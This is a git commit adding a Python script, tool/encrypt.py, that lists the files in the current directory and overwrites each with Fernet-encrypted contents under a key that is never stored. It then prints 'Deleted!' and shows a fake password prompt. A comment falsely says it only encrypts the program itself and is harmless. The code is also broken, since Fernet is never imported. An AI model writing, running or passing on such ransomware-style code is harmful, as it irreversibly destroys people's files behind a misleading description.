9be5fba4d067ac97a48a36a48f3a928e1e437b8e
Chai <83523587+CPScript@users.noreply.github.com>
2023-03-14 08:42:49 -0400

    Create

---
+++ tool/encrypt.py
@@ -0,0 +1,50 @@
+import os
+import time
+from os import system
+from platform import platform
+
+# delete
+puk = platform()[0], platform()[1],  platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]
+
+if puk == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
+    delet = 'cls'
+    dr = '\\'
+else:
+    delet = 'clear'
+    dr = '/'
+
+os.system(delet)
+
+# Used to encrypt this program (does not harm ur computer(mabey)...
+
+files = []
+
+for file in os.listdir():
+	if file == "requirements.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+print(files)
+
+# Creating a encrpytionkey that will be used to lock the found files
+secretkey = Fernet.generate_key()
+
+# Going through the files list and encrpying everything
+for file in files:
+	with open(file, "rb") as thefile:
+		contents = thefile.read()
+	contents_encrypted = Fernet(secretkey).encrypt(contents)
+	with open(file, "wb") as thefile:
+		thefile.write(contents_encrypted)
+   
+print("Deleted!")   
+
+time.sleep(5)
+# LITERALY THE FUCKING PASSWORD
+password = "dycrypt"
+
+os.system(delet)
+print("Orbit <-0->")
+print("Type ur 'dycrypt' password.")
+time.sleep(5)
+print("Type password:")
